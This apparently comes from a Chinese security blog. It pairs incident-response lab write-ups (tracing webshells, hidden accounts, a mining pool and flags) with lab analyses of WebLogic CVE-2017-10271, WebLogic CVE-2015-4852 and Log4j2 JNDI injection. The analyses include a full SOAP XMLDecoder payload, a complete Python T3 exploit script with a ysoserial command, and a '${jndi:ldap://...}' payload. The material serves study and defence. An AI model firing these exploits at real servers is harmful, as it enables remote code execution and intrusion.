从宝塔数据库界面获取到数据库用户名和密码：kaoshi&#x2F;5Sx8mK5ieyLPb84m 登录成功 之后依次输入以下命令，show databases;，use kaoshi;，show tables;，select * from x2_user;，即可获取到管理员密码的密文：f6f6eb5ace977d7e114377cc7098b7e3 之后md5解密即可获取到明文：Network@2020 3.之后是去查找第一次Webshell的连接URL，我们把靶机中的流量文件拿出来用wireshark分析一下： （很奇怪，我Xftp传输失败了，于是我直接从宝塔界面里下载的） 可看出是index.php?user-app-register 3.从上图可看出，Webshell连接密码：Network2020 或者从宝塔中添加一个域名进行php网站的访问，从后台可看到： 4.查找提交数据包的flag1，直接从wirshark里看数据包1： 得到flag1：flag1&#123;Network@_2020_Hack&#125; 5.至于攻击者使用的后续上传的木马文件名称，攻击者既然上传了该木马文件，那就八成会访问，我们继续去看看流量包里的http流，发现除了index.php?user-app-register之外，还有version2.php，我们去查看一下index.php?user-app-register中POST的具体内容： 发现是冰蝎的马，之后在version2.php中http传输的都是加密过的数据了 故攻击者使用的后续上传的木马文件为version2.php 6.要看隐藏的flag2，直接去宝塔上看文件的修改日期： 发现多了一个奇奇怪怪的.api文件夹，且其修改时间正好和我们做第一问的时候黑客的登录时间相仿，故猜测flag2在其中 如上时间中，alinotify.php的修改时间最为特别，猜测是黑客将api文件夹复制过来后又单独对该文件进行了更改，因此查看该文件获取flag2：flag&#123;bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9&#125; 7.至于隐藏的flag3，位于history中： 或者直接env查看环境变量： 应急响应靶机–Web1挑战内容前景需要： 小李在值守的过程中，发现有CPU占用飙升，出于胆子小，就立刻将服务器关机，并找来正在吃苕皮的hxd帮他分析，这是他的服务器系统，请你找出以下内容，并作为通关条件： 1.攻击者的shell密码 2.攻击者的IP地址 3.攻击者的隐藏账户名称 4.攻击者挖矿程序的矿池域名(仅域名) 5.有实力的可以尝试着修复漏洞 凭据：administrator&#x2F;Zgsf@admin.com 解题1.打开虚拟机看到phpstudy，我们直奔其网站根目录，用火绒查杀去扫： 发现shell，我们去查看（有点尴尬，我刚扫完，系统自动给我把🐎删了，没快照，只能重新开一次了） 典型冰蝎马，shell密码为rebeyong 2.要获取攻击者IP，直接去看日志就好了，去网站根目录搜log，发现C:\\phpstudy_pro\\Extensions\\Apache2.4.39\\logs\\access.log有东西： 对着登录页面使劲请求，盲猜爆破账号密码，故192.168.126.1即为攻击者IP 3.要找攻击者隐藏账户名称，直接去控制面板看就好了： 也可以直接去看注册表或者事件管理器，甚至直接去看文件夹里的用户： 4.要看攻击者矿池程序的矿池域名，我们得去恶意用户的文件夹下找到矿池程序： 该图标为pyinstaller打包，使用pyinstxtractor进行反编译(https://github.com/extremecoders-re/pyinstxtractor) 再使用在线pyc反编译python反编译 - 在线工具 (tool.lu) 即可获取源码进而得到矿池域名：wakuang.zhigongshanfang.top 应急响应靶机–Web2挑战内容前景需要：小李在某单位驻场值守，深夜12点，甲方已经回家了，小李刚偷偷摸鱼后，发现安全设备有告警，于是立刻停掉了机器开始排查。 这是他的服务器系统，请你找出以下内容，并作为通关条件： 1.攻击者的IP地址（两个）？ 2.攻击者的webshell文件名？ 3.攻击者的webshell密码？ 4.攻击者的伪QQ号？ 5.攻击者的伪服务器IP地址？ 6.攻击者的服务器端口？ 7.攻击者是如何入侵的（选择题）？ 8.攻击者的隐藏用户名？ 凭据：administrator&#x2F;Zgsf@qq.com 解题1.要看攻击者的IP地址，还是去看日志： 其中一个IP是192.168.126.135，这个是传🐎连🐎的IP，还有一个，猜测是远程登录的IP，等下边再说 2.攻击者的webshell文件名，很简单，直接把根目录放火绒里扫就行了：system.php 3.攻击者webshell密码直接去看木马文件即可：hack6618 4.提到QQ号，这就不得不去看Tencent Files了，也算是QQ的一个特性吧，会在该文件下以QQ号为名创建一个文件夹：777888999321 5.攻击者的伪服务器IP，这个是在QQ接收的文件中找到的：255.256.66.88 6.端口也出来了：65536（当然都是伪的） 7.至于攻击者是怎么打进来的，这个去翻翻日志就知道了： 在图中文件里，攻击者IP反复请求FTP进行登录爆破，最终成功以admin身份登录 8.至于隐藏用户名，我们去注册表查看即可，Win+R输入regedit：hack887（后边的$为隐藏的意思） 现在，我们还差第一问的另一个IP地址，这个我们之前就猜测是远程登录用的IP，现在我们得知了攻击者的隐藏用户，接下来去事件查看器即可查看其另一个IP：192.168.126.129 至此，本靶机结束 应急响应靶机–Web3挑战内容前景需要：小苕在省护值守中，在灵机一动情况下把设备停掉了，甲方问：为什么要停设备？小苕说：我第六感告诉我，这机器可能被黑了。 这是他的服务器，请你找出以下内容作为通关条件： 攻击者的两个IP地址 隐藏用户名称 黑客遗留下的flag【3个】 本虚拟机的考点不在隐藏用户以及ip地址，仔细找找把。 凭据：administrator&#x2F;xj@123456 解题环境没起出来，直接看官方题解了： https://mp.weixin.qq.com/mp/wappoc_appmsgcaptcha?poc_token=HLwhV2aj1vpy_D8q_3g_qGiJjIPIyisfz6bgKTEs&amp;target_url=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FYvCL27cfX5pfD0LiVt4EeA 下面写一下看完后的总结： 1.攻击者IP地址直接去日志文件看 2.隐藏用户可以去控制面板，也可去注册表等查看 3.任务计划程序里可能会看到可疑任务，进而查看可疑任务的具体内容会有收获 4.Web应用中可能存在明显的漏洞导致已经被黑客入侵，例如本题中的Z-blog 应急响应靶机–近源渗透OS-1挑战内容前景需要：小王从某安全大厂被优化掉后，来到了某私立小学当起了计算机老师。某一天上课的时候，发现鼠标在自己动弹，又发现除了某台电脑，其他电脑连不上网络。感觉肯定有学生捣乱，于是开启了应急。 1.攻击者的外网IP地址 2.攻击者的内网跳板IP地址 3.攻击者使用的限速软件的md5大写 4.攻击者的后门md5大写 5.攻击者留下的flag 凭据：Administrator&#x2F;zgsf@2024 解题直接CMD mstsc远程桌面连接了 1.把桌面文件放到奇安信威胁情报中心里进行分析，发现如下文件存在恶意宏，且存在攻击者的外网IP：8.219.200.130 2.至于其内网IP，没啥思路，去看看有无隐藏文件什么的，把文件夹中改成显示隐藏文件： 发现隐藏文件： 攻击者内网IP：192.168.20.129 3.至于限速软件，我们只能去翻C盘文件发现可疑文件：C:\\PerfLogs\\666\\666\\777\\666\\666\\666\\666\\666\\666\\666\\666\\666\\666\\666\\p2pover4.34.exe、 然后去搜索引擎搜一下： 限速文件就是它了，至于MD5，丢奇安信威胁情报中心就出来了 4.后门在5次shift键里，而其后门文件自然就是攻击者替换了C:\\Windows\\System32\\sethc.exe文件： 5.flag如上如所示，按5次shift键就出来了 应急响应靶机–挖矿挑战内容前景需要：机房运维小陈，下班后发现还有工作没完成，然后上机器越用越卡，请你帮他看看原因。 挑战内容： 攻击者的IP地址 攻击者开始攻击的时间 攻击者攻击的端口 挖矿程序的md5 后门脚本的md5 矿池地址 钱包地址 攻击者是如何攻击进入的 凭据：Administrator&#x2F;zgsf@123 解题没有安装vmware Tools，直接mstsc连接即可，最近新安了蓝队应急响应工具箱，正好试一试 1.可见登录失败的日志中IP：192.168.115.131反复出现，故可猜测该IP为攻击者IP 2.至于开始攻击的时间，直接去看上图的Date：2024-05-21 20:25:22 3.至于攻击者攻击的端口，还是看上边那个图，Workstation显示NtLmSap，经搜索得知是攻击者爆破3389端口 4.至于挖矿程序md5，去任务管理器里找： 就这个资源占用最多，直接计算hash 5.至于后门脚本，用火绒剑扫： 发现可疑文件，打开看看： 一眼与C3Pool挖矿有关，故此为挖矿脚本，计算其hash即可 5.矿池地址如上图所示：c3pool.org 6.钱包地址也如上图所示：4APXVhukGNiR5kqqVC7jwiVaa5jDxUgPohEtAyuRS1uyeL6K1LkkBy9SKx5W1M7gYyNneusud6A8hKjJCtVbeoFARuQTu4Y 7.攻击者如何进入的，这个其实前边已经提到了：暴力破解3389远程登录密码，填暴力破解即可","categories":[],"tags":[]},{"title":"JAVA安全:Weblogic之CVE-2017-10271_XMLDecoder漏洞","slug":"JAVA安全Weblogic之CVE-2017-10271_XMLDecoder漏洞","date":"2024-05-02T03:32:26.185Z","updated":"2024-05-02T07:28:39.374Z","comments":true,"path":"2024/05/02/JAVA安全Weblogic之CVE-2017-10271_XMLDecoder漏洞/","link":"","permalink":"http://example.com/2024/05/02/JAVA%E5%AE%89%E5%85%A8Weblogic%E4%B9%8BCVE-2017-10271_XMLDecoder%E6%BC%8F%E6%B4%9E/","excerpt":"作者：Narcher 时间：2024&#x2F;5&#x2F;2 分类：Vulnerability Analysis","text":"作者：Narcher 时间：2024&#x2F;5&#x2F;2 分类：Vulnerability Analysis 前言直接跟着Drunkbaby佬整理的学习路线开始学了，本文记录一下学习过程 正文XMLDecoder可以读取XMLEncoder生成的XML文档进行命令执行，类似于Fastjson中的json的序列化和反序列化 示例首先生成一个xml文档： 1234567891011121314import javax.swing.*;import java.io.BufferedOutputStream;import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.beans.XMLEncoder;public class XMLEncoder_test &#123; public static void main(String[] args) throws FileNotFoundException &#123; FileOutputStream file = new FileOutputStream(&quot;result.xml&quot;); XMLEncoder xmlEncoder = new XMLEncoder(new BufferedOutputStream(file)); xmlEncoder.writeObject(new JButton(&quot;2333333&quot;)); xmlEncoder.close(); &#125;&#125; 生成的result.xml如下： 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;java version=&quot;1.7.0_21&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;object class=&quot;javax.swing.JButton&quot;&gt; &lt;string&gt;2333333&lt;/string&gt; &lt;/object&gt;&lt;/java&gt; 之后使用XMLDecoder反序列化即可： 1234567891011121314import java.io.BufferedInputStream;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.beans.XMLDecoder;public class XMLDecoder_test &#123; public static void main(String[] args) throws FileNotFoundException &#123; FileInputStream file = new FileInputStream(&quot;result.xml&quot;); XMLDecoder xmlDecoder = new XMLDecoder(new BufferedInputStream(file)); Object o = xmlDecoder.readObject(); System.out.println(o); xmlDecoder.close(); &#125;&#125; 输出： 。。。。。。。。。。 问题：现在有点疑惑网上的恶意xml文档是自己编写的还是用XMLEncoder生成的，因为我自己编写Java生成这个的时候出了些问题，感觉无法复现，网上流传的恶意xml文档都是直接给出的xml，没XMLEncoder的代码，如下： 12345678910&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;java version=&quot;1.7.0_21&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;array class=&quot;java.lang.String&quot; length=&quot;1&quot;&gt; &lt;void index=&quot;0&quot;&gt; &lt;string&gt;Calc&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;&lt;/java&gt; XMLDecoder解析后会弹出计算器： 后来问了问Drunkbaby师傅，这种都是直接编写的xml文档，那就要学一下xml的格式了 。。。。。。。。。。 XML基础这里主要是看一些常用的xml标签，其实网上的都大同小异，知道怎么用就行 string标签通常作为子标签充当参数，例如： 123456 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;java version=&quot;1.7.0_21&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;object class=&quot;javax.swing.JButton&quot;&gt; &lt;string&gt;2333333&lt;/string&gt; &lt;/object&gt;&lt;/java&gt; object标签object表示对象，通常用来指定调用的类，例如： 123&lt;object class=&quot;javax.swing.JButton&quot;&gt; &lt;string&gt;2333333&lt;/string&gt;&lt;/object&gt; void标签void标签用处比较广泛，可用于函数或者类的调用，以及赋值等，例如： 1234567&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;array class=&quot;java.lang.String&quot; length=&quot;1&quot;&gt; &lt;void index=&quot;0&quot;&gt; &lt;string&gt;Calc&lt;/string&gt; &lt;/void&gt; &lt;/array&gt;&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt; array标签array表示数组，表明了数组的类型和长度等，内部可用void标签的index属性指定对应索引使用string标签进行赋值，例如： 12345&lt;array class=&quot;java.lang.String&quot; length=&quot;1&quot;&gt; &lt;void index=&quot;0&quot;&gt; &lt;string&gt;Calc&lt;/string&gt; &lt;/void&gt;&lt;/array&gt; 环境搭建因为这个漏洞主要针对的是WebLogic中WLS-WebServices的组件，所以用之前的环境就够了 详情请看上一篇文章：JAVA安全:Weblogic之CVE-2015-4852反序列化漏洞 | Narcherの小窝 漏洞复现WebLogic的接口&#x2F;wls-wsat&#x2F;CoordinatorPortType可以接收XML的数据包，只是需要用SOAP型的格式进行一些包装即可 数据包如下，直接用的Drunkbaby师傅的poc： 123456789101112131415161718192021222324252627282930313233POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: 192.168.58.128:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: rememberMe=0P214RoHwjsUeSFEpelw10AyENEhVPUZ7Nz6zTsrGCqNikS9UAjsjoU66N22+jnpKV6cPMvTbMIC8POClLrLraGBSUnEWJHhsSLRr6Em+FigyKn1cUyoV3QXhkfQQlt5JxsIZUvTyx9xHvtHCAQE/FQv0TSwVY/4I4DUBJ82qxchbVo7/bqpd8EUGLnZWIuj1+RLfHC4BRV6hj89QKWBWHajSZ1ni24DmoyCCA5nphp4xiulIU/KshFs8bC3enUuPA2/MMywqZWmY0IjOtw+JkXULgbE3DDlU5Mw9jQnA6Z1HjVX2hbLwr//wi/2KOEgYd4Ssieu1IgA7qVk4Hty3BkEGf9A+u/Y33LVioO2Sy/NFr+rywQwQqNqjmA3vGWzdQ1WucoEsCrlcn84ax/DehCba2PLDCOl8sT9qn/fhhWIdoemS8s1UPHWWXqxNjg5tySUUq0TQjWngVCnd4eAtq04oHXj4UthTJHA1jeeQzAK+LLyiziWgI4ZV0s2G6eiM7NqfKAJl1/GjrE59GL2JQ==; ADMINCONSOLESESSION=l8XsmzwdZMP8W1yn0766JTGwf3G2k2NQpl3Z9C25dFqTQ7vsGty0!1153042568Upgrade-Insecure-Requests: 1Content-Type: text/xmlContent-Length: 646&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt; &lt;void index=&quot;0&quot;&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index=&quot;1&quot;&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=&quot;2&quot;&gt; &lt;string&gt;ping aaa.9y1gq6.dnslog.cn&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt; 发现打通了（这里的格式要求有点怪，我删了几个空格就执行不了了）： 如果要修改命令的话就更改如下部分： 1&lt;string&gt;ping aaa.9y1gq6.dnslog.cn&lt;/string&gt; 漏洞分析在wlserver&#x2F;server&#x2F;wls-wsat.war&#x2F;WEB-INF&#x2F;web.xml中存在着许多接口（未截全）： 只要它们能处理SOAP报文，就存在XMLDecoder漏洞 前人以及确定好处理的大致流程路线了，不需要我们自己去找，我们直接把断点打在wlserver\\server\\lib\\weblogic.jar!\\weblogic\\wsee\\jaxws\\workcontext\\WorkContextServerTube类的processRequest方法处： 待我们发包之后，发现此处的var1就是我们POST传入的数据： 我们接下来继续跟进，首先var1不为null，进入var2和var3的赋值操作，var2是数据中的headers，之后对var2处理后又赋值给var3： 判断var3不为空之后进入WorkContextServerTube类的readHeaderOld方法： 到var4的时候就已经是我们的恶意XML了： 经过一系列的赋值，也就是层层封装之后，进行var6的创建工作，我们跟进去看一下： 发现其实是XMLDecoder的创建工作，那么我们跟进this.receive(var6)看一下： 经过赋值操作之后触发WorkContextMapImpl类的receiveRequest方法： 再进入WorkContextLocalMap类的receiveRequest方法： 之后把var1传入到WorkContextEntryImpl类的readEntry方法： 跟进readUTF方法发现此处调用了XMLDecoder的readObject方法进行了反序列化 至此流程结束","categories":[],"tags":[]},{"title":"JAVA安全:Weblogic之CVE-2015-4852反序列化漏洞","slug":"JAVA安全Weblogic之CVE-2015-4852反序列化漏洞","date":"2024-05-01T06:16:21.261Z","updated":"2024-05-01T11:48:54.548Z","comments":true,"path":"2024/05/01/JAVA安全Weblogic之CVE-2015-4852反序列化漏洞/","link":"","permalink":"http://example.com/2024/05/01/JAVA%E5%AE%89%E5%85%A8Weblogic%E4%B9%8BCVE-2015-4852%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","excerpt":"作者：Narcher 时间：2024&#x2F;5&#x2F;1 分类：Vulnerability Analysis","text":"作者：Narcher 时间：2024&#x2F;5&#x2F;1 分类：Vulnerability Analysis 前言在很久之前就听说过weblogic的漏洞，但一直没有复现过，最近看了看网上的文章，感觉总是在一些我理解不了的步骤那里跳过，无奈只能自己写一篇来记录一下具体流程（当然，分析思路肯定还是看的网上大佬们的思路） WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。 weblogic详解 - 疯子110 - 博客园 (cnblogs.com) 实际上可以理解成比tomcat要6的充钱版？ 正文环境搭建QAX-A-Team&#x2F;WeblogicEnvironment: Weblogic环境搭建工具 (github.com) 直接使用上边的QAX-A-Team的脚本可能会有点问题，这里推荐看一下Drunkbaby大佬的文章： CVE-2015-4852 WebLogic T3 反序列化分析 | Drunkbaby’s Blog (drun1baby.top) 至于远程调试环节，Drunkbaby佬说的不是很清楚，我就在这里补充一下： 在虚拟机终端输入以下命令： 123456789#进入容器sudo docker exec -it weblogic1036jdk7u21 /bin/bashcd /u01/app/oracle/cp -r middleware/ /root/WeblogicEnvironment-master/exit#宿主机执行sudo docker cp 7a84dc24433b:/root/WeblogicEnvironment-master . sudo chown -R root:root WeblogicEnvironment-mastertar czvf newfile.tar.gz WeblogicEnvironment-master 之后将newfile.tar.gz复制到有IDEA的机子上，将其解压后，用IDEA打开WeblogicEnvironment-master\\wlserver目录，配置好SDK和Remote远程调试即可： weblogic环境部署与远程调试 | 极客无影 (bleke.top) 上边这篇文章对之后的步骤讲的很详细，我就不重复了 漏洞复现使用下列脚本： 123456789101112131415161718192021222324252627282930import socketimport structdef exp(host, port): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server_address = (host, int(port)) data = &quot;&quot; try: sock.connect(server_address) headers = &#x27;t3 12.2.1\\nAS:255\\nHL:19\\n\\n&#x27;.format(port) sock.sendall(headers.encode()) # 将字符串转换为字节对象 data = sock.recv(2) f = open(&#x27;./payload&#x27;, &#x27;rb&#x27;) payload_obj = f.read() f.close() payload1 = bytes.fromhex(&quot;000005ba016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000&quot;) payload3 = bytes.fromhex(&quot;aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870774b210000000000000000000d31302e3130312e3137302e3330000d31302e3130312e3137302e33300f0371a20000000700001b59ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870771d01a621b7319cc536a1000a3137322e31392e302e32f7621bb50000000078&quot;) payload2 = payload_obj payload = payload1 + payload2 + payload3 payload = struct.pack(&#x27;&gt;I&#x27;, len(payload)) + payload[4:] sock.send(payload) data = sock.recv(4096) except socket.error as e: print (u&#x27;socket 连接异常！&#x27;) finally: sock.close()exp(&#x27;192.168.58.128&#x27;, 7001) 其中，payload是ysoserial的输出： 1java -jar ysoserial.jar CommonsCollections1 &quot;ping jiznv3.dnslog.cn&quot; &gt; payload 之后直接运行查看dnslog： 命令执行成功 漏洞分析我们将断点打在InboundMsgAbbrev类的readObject方法处： 之后运行脚本，查看断点处的状态，首先是var2的赋值，之后会进入case0，我们先看一下ServerChannelInputStream类的创建工作 实际上这个就是InboundMsgAbbrev类里的一个内部类，我们继续跟进到MsgAbbrevInputStream类的getServerChannel方法： 此时connection也是一个内部类weblogic.rjvm.t3.MuxableSocketT3$T3MsgAbbrevJVMConnection@7a17787e，用于weblogic服务器和JVM之间使用T3协议传输数据，之后跟进getChannel方法，可以看出大致上就是对T3协议传输数据的处理： 至于之后的getChannel方法，就是把socket传入数据的处理结果进行返回 之后便出来了，开始执行ServerChannelInputStream类的readObject方法，但这个类并未对readObject方法进行重写，而是触发了继承自其父类ObjectInputStream类的readObject方法： 看到这里自然就想起之前学CC链的时候，最终序列化和反序列化操作的编写了，我这里把它们拿过来： 123456//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));oos.writeObject(o);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));ois.readObject(); 所以说走到这步就可以停下来了，剩下的就是最基本的反序列化操作 说白了就是weblogic在处理T3协议传入的序列化数据时调用了ObjectInputStream类的readObject方法而又没加任何限制，从而导致的反序列化漏洞中CC链的执行 T3协议学习T3 协议其实就是Weblogic RMI 调用时的通信协议，来看一下z_zz_zzz师傅的图： 此时我们回头看EXP脚本中的内容，发现在payload的前后都加上了一串数据，这其实就是T3协议的格式（后边的有没有好像无所谓？） 第一部分是请求包的头部，t3+weblogic客户端的版本号，第二部分是weblogic服务器的返回数据，HELO+weblogic服务器版本号，第三部分就是我们拼接的payload了 十六进制如下： 可以在00000078对应的行数看到十六进制的ac ed 00 05，说明这后边跟的就是我们的Java序列化数据 进一步的学习推荐去看修复weblogic的JAVA反序列化漏洞的多种方法 | WooYun知识库 (xmd5.com)这篇文章 小结要学的东西还有很多。。。。。。","categories":[],"tags":[]},{"title":"JAVA安全:Log4j2远程代码执行漏洞","slug":"JAVA安全Log4j2远程代码执行漏洞","date":"2024-04-25T06:52:22.999Z","updated":"2024-09-15T13:06:27.255Z","comments":true,"path":"2024/04/25/JAVA安全Log4j2远程代码执行漏洞/","link":"","permalink":"http://example.com/2024/04/25/JAVA%E5%AE%89%E5%85%A8Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","excerpt":"作者：Narcher 时间：2024&#x2F;4&#x2F;25 分类：Vulnerability Analysis","text":"作者：Narcher 时间：2024&#x2F;4&#x2F;25 分类：Vulnerability Analysis 前言因为在做NSSCTF题库里边的Java题的时候，碰到了一个Fastjson反序列化+Log4j的漏洞。前边学习了Fastjson反序列化漏洞，而Log4j漏洞比较老了，Log4j2漏洞比较新，于是就开始学习一下Log4j2的远程代码执行漏洞。 Apache Log4j2是一个开源的日志记录组件，使用非常的广泛。在工程中以易用方便代替了 System.out 等打印语句，它是JAVA下最流行的日志输入工具。 使用 Log4j2 在一定场景条件下处理恶意数据时，可能会造成注入类代码执行。下面我们来看一下具体流程。 正文1.环境搭建新建maven项目，在pom.xml中加入以下依赖： 12345678910111213141516&lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;2.14.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-api&lt;/artifactId&gt; &lt;version&gt;2.14.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt;&lt;/dependency&gt; 至于jdk版本，我用的是8u65，因为Log4j的2.13版本以上对1.8版本之前的不兼容嘛，但要低于8u191，因为之后的版本对于从请求ldap服务并获取Codebase路径之后，在请求Codebase下载Class文件流程中的请求Codebase过程中默认关闭了trustUrlCodebase，所以不会去请求Codebase 然后日志也要输出，我们在src&#x2F;main&#x2F;resources目录下添加一个log4j2.xml文件，内容如下： 12345678910111213141516171819202122232425&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;configuration status=&quot;info&quot;&gt; &lt;Properties&gt; &lt;Property name=&quot;pattern1&quot;&gt;[%-5p] %d %c - %m%n&lt;/Property&gt; &lt;Property name=&quot;pattern2&quot;&gt; =========================================%n 日志级别：%p%n 日志时间：%d%n 所属类名：%c%n 所属线程：%t%n 日志信息：%m%n &lt;/Property&gt; &lt;Property name=&quot;filePath&quot;&gt;logs/myLog.log&lt;/Property&gt; &lt;/Properties&gt; &lt;appenders&gt; &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt; &lt;PatternLayout pattern=&quot;$&#123;pattern1&#125;&quot;/&gt; &lt;/Console&gt; &lt;RollingFile name=&quot;RollingFile&quot; fileName=&quot;$&#123;filePath&#125;&quot; filePattern=&quot;logs/$$&#123;date:yyyy-MM&#125;/app-%d&#123;MM-dd-yyyy&#125;-%i.log.gz&quot;&gt; &lt;PatternLayout pattern=&quot;$&#123;pattern2&#125;&quot;/&gt; &lt;SizeBasedTriggeringPolicy size=&quot;5 MB&quot;/&gt; &lt;/RollingFile&gt; &lt;/appenders&gt; &lt;loggers&gt; &lt;root level=&quot;info&quot;&gt; &lt;appender-ref ref=&quot;Console&quot;/&gt; &lt;appender-ref ref=&quot;RollingFile&quot;/&gt; &lt;/root&gt; &lt;/loggers&gt;&lt;/configuration&gt; 而其具体的输出则会输出到logs目录下的myLog.log文件中 之后的测试代码我也从这里贴出来： 123456789101112import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;import java.util.function.LongFunction;public class Test2 &#123; public static void main(String[] args) &#123; Logger logger = LogManager.getLogger(LongFunction.class); String username = &quot;$&#123;jndi:ldap://127.0.0.1:7777/TestRef&#125;&quot;; logger.info(&quot;User &#123;&#125; login in!&quot;, username); &#125;&#125; 整个项目差不多长这样，Test.java不用管： 2.漏洞复现如果我们正常传入username，输出如下： 而在其官方文档Log4j – Log4j 2 Lookups (apache.org)中提到了这样的一个东西： 我们把username修改成${java:os}看一下情况： 输出了os的版本，这个的危害倒也不是很大，真正有危害的是下边的这个： 支持jndi查询，这样的话，如果目标出网，我们就可以利用Jndi注入远程执行恶意代码，具体流程如下： 在本地恶意类TestRef.class的目录处起一个http服务，之后再叠一个ldap服务，具体代码在Fastjson的复现里贴了，这里就不再搬过来了。服务搭建起来后运行Test2即可远程加载恶意类进行命令执行： 发现成功弹出计算器，并且貌似命令还执行了两遍，我们下面来调试看看具体流程 3.漏洞分析这里是跟着Drun1baby师傅的思路走的，其实刚开始打了几个断点准备从头开始一点点看， 但等看到PatternLayout这个类之后发现确实重点在这后边，前边都是些赋值之类的操作 从PatternLayout类的toSerializable方法开始打个断点： 这里的传参中，event包含了我们的传参，此刻buffer还为空，我们继续往下看： 进入了这个for循环之后就加上调用format方法给buffer赋值，大致流程如下： 先进入format方法： 然后会根据skipFormattingInfo的情况分别进入不同的情况，这里进入的format方法取决于this的converter的值： 像上图这种就会进入LiteralPatternConverter类的format方法中 就这样循环了7次后，会进入MessagePatternConverter类的format方法： 